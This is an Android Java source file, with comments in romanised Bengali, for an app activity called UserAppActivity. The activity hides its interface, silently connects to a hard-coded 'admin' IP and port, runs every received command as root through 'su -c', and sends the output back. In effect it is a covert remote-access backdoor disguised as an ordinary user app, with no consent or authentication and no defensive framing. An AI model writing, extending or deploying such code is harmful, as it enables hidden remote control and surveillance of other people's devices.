package com.example.userapp;

import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class UserAppActivity extends AppCompatActivity {
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private static final String ADMIN_IP = "192.168.1.100"; // Admin er IP
    private static final int PORT = 8080;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // UI Hide kora
        Window window = getWindow();
        window.addFlags(WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
        window.clearFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
        
        // Background Service start kora connection maintain korar jonno
        new Thread(() -> connectToAdmin()).start();
        setContentView(R.layout.activity_main); // Empty layout
    }

    private void connectToAdmin() {
        try {
            socket = new Socket(ADMIN_IP, PORT);
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            
            String command;
            while ((command = in.readLine()) != null) {
                if (command.equals("END")) break;
                executeCommand(command);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void executeCommand(String cmd) {
        try {
            // Root access thakle 'su' use kora, na hole normal command
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String response = "";
            String line;
            while ((line = reader.readLine()) != null) {
                response += line + "\n";
            }
            // Result Admin e send kora
            out.println(response);
            out.flush();
        } catch (IOException e) {
            out.println("Error: " + e.getMessage());
        }
    }
}
